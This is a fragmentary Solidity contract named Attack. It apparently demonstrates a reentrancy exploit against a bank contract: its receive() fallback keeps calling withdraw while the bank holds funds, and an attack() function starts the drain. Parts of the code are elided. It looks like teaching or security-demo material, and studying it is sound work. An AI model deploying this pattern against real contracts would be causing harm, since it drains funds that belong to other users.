...
contract Attack {
    OnTheChainBank public etherStore;

    uint256 public amount;

    constructor(address payable _etherStoreAddress) payable {
        etherStore = OnTheChainBank(_etherStoreAddress);
        amount = 10000;
    }
    ...
    function setUpDeposit() public payable {
    ...
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            // uint256 bal = etherStore.checkBalance();
            etherStore.withdraw(amount);
        }
    }

    function setWithdrawAmount(uint256 val) public {
        amount = val;
    }

    function getBankBal() external view returns (uint256) {
        return etherStore.checkBalance();
    }

    function attack() external payable {
        uint256 bal = etherStore.checkBalance();
        // etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(bal);
    }
